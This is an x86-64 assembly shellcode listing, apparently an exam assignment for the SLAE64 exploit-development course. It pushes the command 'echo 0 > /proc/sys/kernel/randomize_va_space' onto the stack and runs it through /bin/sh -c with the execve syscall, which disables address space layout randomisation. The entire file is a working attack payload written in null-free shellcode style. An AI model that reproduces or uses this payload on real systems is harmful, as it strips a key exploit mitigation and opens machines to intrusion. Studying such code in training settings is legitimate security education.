
;Exam Assignment (other personnal shellcode)
;Disable aslr security using execve and echo command
;Christophe G SLAE64 - 1337


global _start


_start:

	xor rcx , rcx
	mov eax , ecx
	push rcx

	push   cx     ; null terminating
	push 0x65636170
	mov r9 , 0x735f61765f657a69
	push r9
	mov r9 , 0x6d6f646e61722f6c
	push r9
	mov r9 , 0x656e72656b2f7379         ; echo 0 >  /proc/sys/kernel/randomize_va_space
        push r9
	mov r9 , 0x732f636f72702f20
	push r9
	mov r9 , 0x3e2030206f686365
	push r9
	mov r9 , rsp

	push cx                        ; null terminate string
	push word 0x632d                    ; "-c"
	mov r8 , rsp



	mov rdi  , 0x68732f6e69622fff    ; "bin/sh"
	shr rdi , 8
	push rdi
	mov rdi , rsp

	push rcx
	pop rdx

	push rdx
	push r9
	push r8
	push rdi
	mov rsi , rsp
	add al , 59
	syscall




